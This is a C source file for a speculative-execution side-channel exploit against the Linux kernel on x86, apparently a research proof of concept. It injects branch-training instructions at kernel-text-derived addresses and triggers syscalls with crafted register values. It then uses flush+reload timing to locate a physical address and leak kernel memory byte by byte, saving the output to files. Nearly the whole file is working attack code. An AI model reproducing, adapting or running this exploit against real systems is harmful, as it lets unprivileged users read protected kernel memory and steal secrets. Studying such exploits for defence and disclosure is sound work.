#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>
#include <time.h>
#include <sched.h>
#include <errno.h>
#include <sys/mman.h>
#include <inttypes.h>
#include <signal.h>
#include <setjmp.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <stdatomic.h>
#include <string.h>
#include <sys/wait.h>
#include "phys.h"

#define HUGEPAGE 2097152
#define ROUNDS 25000
#define PTRN 0xffff800800000000
#define BLOCK_SIZE 8

#define str(s) #s
#define xstr(s) str(s)

uint64_t training_jmp;
uint64_t training_call;
uint64_t victim_phantom_call;

char fifo[1024];
struct work {
    uint64_t next_block;
    uint64_t done_blocks;
    uint64_t total_blocks;
    char padding[64];
};

typedef struct {
    _Atomic int current_block;
    int max_block;
    char padding[64];
} CoreWork;

static inline double elapsed_sec(struct timespec a,
                                 struct timespec b)
{    return (double)(b.tv_sec - a.tv_sec) +
           (double)(b.tv_nsec - a.tv_nsec) * 1e-9;
}

void set_training_addrs(uint64_t jmp_loc, uint64_t call_loc){
    training_jmp = jmp_loc ^ PTRN;
    training_call = call_loc ^ PTRN;
    victim_phantom_call = call_loc;

    mmap((void *)(training_jmp & ~0xfff), 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);
    mmap((void *)(training_call & ~0xfff), 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED_NOREPLACE, -1, 0);

    *(uint32_t *)training_jmp = 0x00e0ff41; //jmp *%r8
    *(uint32_t *)training_call = 0x00d0ff41; //call *%r8
}

void unset_training_addrs(){
    munmap((void *)(training_jmp & ~0xfff), 8192);
    munmap((void *)(training_call & ~0xfff), 8192);
}

static inline void insert_p_jmp(){
    asm(
        "pushq $2f\n\t"
        "movq %[br_src], %%rcx\n\t"
        "mov %0, %%r8\n\t"
        "call 1f\n\t"
        "jmp *%%rcx\n\t"
        "1:\n\t"
        "popq %%rax\n\t"
        "clflush (%%rsp)\n\t"
        "ret\n\t"
        "2:\n\t"
        :: "r"(victim_phantom_call), [br_src]"r"(training_jmp): "r8", "rax", "rbx", "rdx", "rcx", "rsi", "rdi", "r9", "r10", "r11", "r14", "r15"
    );
}

static inline void insert_p_call(){
    asm(
        "pushq $2f\n\t"
        "movq %[br_src], %%rcx\n\t"
        "mov %0, %%r8\n\t"
        "call 1f\n\t"
        "jmp *%%rcx\n\t"
        "1:\n\t"
        "popq %%rax\n\t"
        "clflush (%%rsp)\n\t"
        "ret\n\t"
        "2:\n\t"
        :: "r"(victim_phantom_call), [br_src]"r"(training_call): "r8", "rax", "rbx", "rdx", "rcx", "rsi", "rdi", "r9", "r10", "r11", "r14", "r15"
    );
}

static inline __attribute__((always_inline)) uint64_t rdtsc(void) {
    uint64_t lo, hi;
    asm volatile ("CPUID\n\t"
            "RDTSC\n\t"
            "movq %%rdx, %0\n\t"
            "movq %%rax, %1\n\t" : "=r" (hi), "=r" (lo)::
            "%rax", "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
    uint64_t lo, hi;
    asm volatile("RDTSCP\n\t"
            "movq %%rdx, %0\n\t"
            "movq %%rax, %1\n\t"
            "CPUID\n\t": "=r" (hi), "=r" (lo):: "%rax",
            "%rbx", "%rcx", "%rdx");
    return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) void flush(unsigned long addr) {
    __asm__ volatile("clflushopt (%0)\n"::"r"(addr));
    __asm__ volatile("clflushopt (%0)\n"::"r"(addr));
}

static inline __attribute__((always_inline)) void reload_range(long base, long stride, int n, uint64_t *results) {
	__asm__ volatile("mfence\n");
	for (uint64_t k = 0; k < n; ++k) {
        uint64_t c = ((k*13+9)&(n-1));
	    unsigned volatile char *p = (uint8_t *)base + (stride * c);
		uint64_t t0 = rdtsc();
		*(volatile unsigned char *)p;
		uint64_t dt = rdtscp() - t0;
		if (dt < 150) results[c]++;
	}
}

int compare(const void *a, const void *b) {
    uint64_t ua = *(const uint64_t *)a;
    uint64_t ub = *(const uint64_t *)b;
    return (ua > ub) - (ua < ub);
}

static inline __attribute__((always_inline)) uint64_t reload(unsigned long offset){
    __asm__ volatile("mfence\n");
    unsigned volatile char *p = (uint8_t *)offset;
    uint64_t t0 = rdtsc();
    *(volatile unsigned char *)p;
    uint64_t dt = rdtscp() - t0;
    return dt;
}

int start_interrupts(){
    int tfd = timerfd_create(CLOCK_MONOTONIC, 0);
    if (tfd < 0) {
        perror("timerfd_create");
        exit(1);
    }

    struct timespec now;
    clock_gettime(CLOCK_MONOTONIC, &now);
    struct itimerspec ts = {0};
    ts.it_value = now;
    ts.it_interval.tv_nsec = 5000;

    timerfd_settime(tfd, TFD_TIMER_ABSTIME, &ts, NULL);

    return tfd;
}

void prepare_core(int core){
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
        perror("sched_setaffinity");
        exit(1);
    }

    snprintf(fifo, sizeof(fifo), "logs/core%d", core % 8);

    int fdout = open(fifo, O_WRONLY);
    if (fdout < 0) { perror("open"); exit(1); }

    dup2(fdout, STDOUT_FILENO);
    dup2(fdout, STDERR_FILENO);
    close(fdout);

    setvbuf(stdout, NULL, _IONBF, 0);
}

void trigger_syscalls(int tfd, uint64_t r13, uint64_t r14){
    uint64_t exp;
    int ret;

    for(int i = 0; i < 1; i++){
        asm volatile(
            "syscall"
            : "=a"(ret)
            : "a"(0),
            "D"(tfd),
            "S"(&exp),
            "d"(8)
            : "rcx","r11","r10","r8","r9","memory", "r12", "r13", "r14"
        );

        for(int j = 0; j < 1; j++){
            insert_p_call();
            insert_p_jmp();


            for(int l = 0; l < 7; l++){

                    asm volatile(
                        "syscall"
                        : "=a"(ret)
                        : "a"(1),
                        "D"(0xaaaaaaaaaaaaaa00), "S"(r13), "d"(r14)
                        : "rcx","r11","r10","r8","r9","memory"
                    );
            }
        }
    }
}

uint64_t leak_bytes(uint64_t base, uint64_t _text, uint64_t phys, uint64_t physmap, uint64_t start_addr, uint64_t len){
    pid_t pids[CORES];

    int fd_comm[2];
    pipe(fd_comm);

    size_t total_size = 4096 * len / BLOCK_SIZE;

    CoreWork *work_queues = mmap(NULL, sizeof(CoreWork) * CORES,
                                  PROT_READ | PROT_WRITE,
                                  MAP_SHARED | MAP_ANONYMOUS, -1, 0);


    uint64_t total_blocks = len / BLOCK_SIZE;

    uint8_t *shared_data = mmap((void *)0x40000000, total_size, PROT_READ | PROT_WRITE, 
                                MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (shared_data == MAP_FAILED || (uint64_t)shared_data != 0x40000000) {
        perror("mmap failed");
        return 1;
    }

    memset(shared_data, 0, total_size);






size_t output_size = total_blocks * BLOCK_SIZE;

int fd_live = open(
    "live_leak.txt",
    O_CREAT | O_RDWR | O_TRUNC,
    0644
);

if (fd_live < 0) {
    perror("open live_leak.txt");
    return 1;
}

/* Initially display every unknown byte as '.'. */
char *initial = malloc(output_size);
if (!initial) {
    perror("malloc");
    close(fd_live);
    return 1;
}

memset(initial, ' ', output_size);

if (write(fd_live, initial, output_size) != (ssize_t)output_size) {
    perror("initialize live_leak.txt");
    free(initial);
    close(fd_live);
    return 1;
}

free(initial);







    for(int core = 0; core < CORES; core++){        
        fflush(stdout);
	    pids[core] = fork();
	
        if(pids[core] == 0){
            fflush(stdout);

            prepare_core(core);
            //uint64_t core_offset = (core + 1) * 4096 * 64 + (core + 1) * 64 * 8;
	    uint64_t core_offset = (core + 0) * 4096 * 64 + (core + 0) * 64 * 8;

            int tfd = start_interrupts();

            printf("core offset %p\n", (void *)core_offset);
            fflush(stdout);

            atomic_init(&work_queues[core].current_block, core * (total_blocks / CORES));
            atomic_init(&work_queues[core].max_block, (core + 1) * (total_blocks / CORES));

	    int16_t leaked[2] = {0};

            while(1){
                int block = __atomic_fetch_add(&work_queues[core].current_block, 1, __ATOMIC_RELAXED);
                if (block >= work_queues[core].max_block) {

                    int found = 0;
                    while(1) {
                        int work_exists_anywhere = 0;

                        for (int i = 0; i < CORES; i++) {
                            if (__atomic_load_n(&work_queues[i].current_block, __ATOMIC_RELAXED) < work_queues[i].max_block) {
                                work_exists_anywhere = 1;
                                
                                block = __atomic_fetch_add(&work_queues[i].current_block, 1, __ATOMIC_RELAXED);
                                if (block < work_queues[i].max_block) {
                                    found = 1;
                                    break; 
                                }
                            }
                        }

                        if (found) break; 

                        if (!work_exists_anywhere) {
                            printf("I AM DONE!\n");
                            _exit(0); 
                        }
                                            }
                }

                printf("STARTING BLOCK %d\n", block);

		int votes[32] = {0};
		int votes2[8] = {0};
                
		uint64_t addr = start_addr + (block * BLOCK_SIZE) - 1;

                for(int offset = 0; offset < BLOCK_SIZE; offset++){
                    set_training_addrs(_text + 0x123e, _text + 0xb6c051 - 3);
                    for(int t = (offset == 0 ? 0 : 1); t < 2; t++){
                        for(int att = 0; att < 10; att++){
                            for (int j = 0; j < 3; j++){
                                for(int16_t upper_bits = 31; upper_bits >= 0; upper_bits--){
                                     if(att == 0) votes[upper_bits] = 0;
				     for(int k = 0; k < 25; k++){
                                        flush(base + core_offset + (upper_bits * 4096));

                                        for (int i = 0; i < 10; i++) {
                                            trigger_syscalls(tfd, physmap + phys - (upper_bits << 6) + core_offset + (upper_bits * 4096), physmap + addr + t);
                                        }

                                        if(reload(base + core_offset + upper_bits * 4096) < 150){
                                            votes[upper_bits]++;
                                        }
                                    }
                                }
                            }

                            int max = -1;
                            for(int j = 31; j >= 0; j--){
                                if(votes[j] >= 5){
                                    max = j;
                                    break;
                                }
                            }

                            if(max != -1){
                                leaked[t]  = max << 3;
                                break;
                            }
                        }
                    }

                    set_training_addrs(_text + 0x123e, _text + 0x12e214c - 3);

		    //printf("%02x ", leaked[1]);

                    int max2 = 0;
                    for(int att = 0; att < 10; att++){
                        for (int j = 0; j < 50; j++){
                                for(int16_t a = 7; a >= 0; a--){
                                    if(att == 0) votes2[a] = 0;

				    flush(base + core_offset + (a * 4096));

                                    for (int i = 0; i < ROUNDS / 1000; i++) {
                                        trigger_syscalls(tfd, physmap + phys - (leaked[0] & 0xc0) - (leaked[1] << 8) - (a << 8) + core_offset - 0x6 + (a * 4096), physmap + addr - 0xb8);
                                    }                    

                                    if(reload(base + core_offset + (a * 4096)) < 150){
                                        votes2[a]++;
                                    }
                            }
                        }

                        for(int j = 7; j >= 0; j--){
                            if(votes2[j] >= 5){
                                max2 = j;
                                break;
                            }
                        }

                        if(votes2[max2]) break;
                    }

                    shared_data[block * 4096 + offset] = leaked[1] + max2;
                    printf("%02x ", leaked[1] + max2);
                    
		    //printf(" (%c) ", leaked[1] + max2);
		    fflush(stdout);
			
                    leaked[0] = leaked[1];


		    uint8_t value = leaked[1] + max2;
		    off_t file_offset = (off_t)block * BLOCK_SIZE + offset;

		    if (pwrite(fd_live, &value, 1, file_offset) != 1) {
    			perror("pwrite");
		    }
		    
                    addr++;
                }   
            }
        }
    }

    for (int i = 0; i < CORES; i++) {
        waitpid(pids[i], NULL, 0);
    }

    int fd = open("leaked.txt", O_CREAT | O_WRONLY | O_TRUNC, 0644);

    for (int i = 0; i < total_blocks; i++) {
        for(int j = 0; j < BLOCK_SIZE; j++){
            dprintf(fd, "%c", shared_data[i * 4096 + j]);
        }
    }

    return 0x0;
}

uint64_t find_phys(uint64_t base, uint64_t _text, uint64_t physmap){
    pid_t pids[CORES];

    int fd_comm[2];
    pipe(fd_comm);

    for(int core = 0; core < CORES; core++){        
	    pids[core] = fork();
	
        if(pids[core] == 0){
            prepare_core(core);
            uint64_t core_offset = core * 4096 * 64 + core * 64 * 8;

            int blocks_per_core = phys_blocks.nblocks / CORES;
            int remainder = phys_blocks.nblocks % CORES;
            
            set_training_addrs(_text + 0x123e, _text + 0x14f24f2 - 3);

            int tfd = start_interrupts();

            uint64_t cycles[ROUNDS / 5] = {0};

            int start = core * blocks_per_core + (core < remainder ? core : remainder);
            int end = (core + 1) * blocks_per_core + ((core + 1) < remainder ? (core + 1) : remainder);

            for (int block = start; block < end; block++) {
                for (uint64_t k = phys_blocks.blocks[block] * phys_blocks.block_size;
                    k < (phys_blocks.blocks[block] + 1) * phys_blocks.block_size;
                    k += HUGEPAGE) {
                        for (int i = 0; i < ROUNDS / 5; i++) {
                            flush(base + core_offset);
                            
                            trigger_syscalls(tfd, physmap + k + core_offset - 0x20, physmap + k + core_offset - 0x20);
                        
                            cycles[i] = reload(base + core_offset);
                        }

                    qsort(cycles, ROUNDS / 5, sizeof(uint64_t), compare);

                    // printf("Lowest cycle = %lu (guess = %p)\n", cycles[0], (void *)k);
                    //printf(".");
                    //fflush(stdout);

                    if(cycles[0] < 150){
                        close(fd_comm[0]);
                        write(fd_comm[1], &k, sizeof(k));
                        printf("\nPhysical address found: %p\n", (void *)k);
                        fflush(stdout);
                        _exit(0);
                    }
                }

		printf(".");
		fflush(stdout);
            }

            while(1){}
        }
    }

    int status;
    pid_t finished_pid = wait(&status); 

    for (int i = 0; i < CORES; i++) {
        if (pids[i] > 0) {
            kill(pids[i], SIGKILL);
            waitpid(pids[i], NULL, 0);
        }
    }

    uint64_t physical_addr = -1;
    close(fd_comm[1]);
    read(fd_comm[0], &physical_addr, sizeof(physical_addr));

    return physical_addr;
}

#define LEAK_LEN 4096

int main(int argc, char *argv[]){
    srand(time(NULL));

    if(argc != 4){
        printf("Usage: %s _text physmap target\n"
                "Example: %s ffffffff81000000 ffff888000000000 0000000123456000\n",
                argv[0], argv[0]);
        fflush(stdout);
        return 1;
    }

    uint64_t _text = strtoul(argv[1], NULL, 16);
    uint64_t physmap = strtoul(argv[2], NULL, 16);
    unsigned long target = strtoul(argv[3], NULL, 16);

    phys_blocks_init();
    
    uint64_t base = (uint64_t)aligned_alloc(HUGEPAGE, HUGEPAGE);
	madvise((void *)base, HUGEPAGE, MADV_HUGEPAGE);

    sleep(1);

    for(int j = 0; j < 512; j++) *(volatile uint64_t *)(base + 4096 * j) = 0xAAAAAAAAAAAAAAAA + j;

    madvise((void *)base, HUGEPAGE, MADV_HUGEPAGE);

    sleep(1);

    struct timespec start, end;

    uint64_t physical = find_phys(base, _text, physmap);
    
    clock_gettime(CLOCK_MONOTONIC, &start); 
    leak_bytes(base, _text, physical, physmap, target, LEAK_LEN);
    clock_gettime(CLOCK_MONOTONIC, &end);

    printf("Leaked %d bytes (%.6f seconds)\n", LEAK_LEN, elapsed_sec(start, end));

    return 0;
}
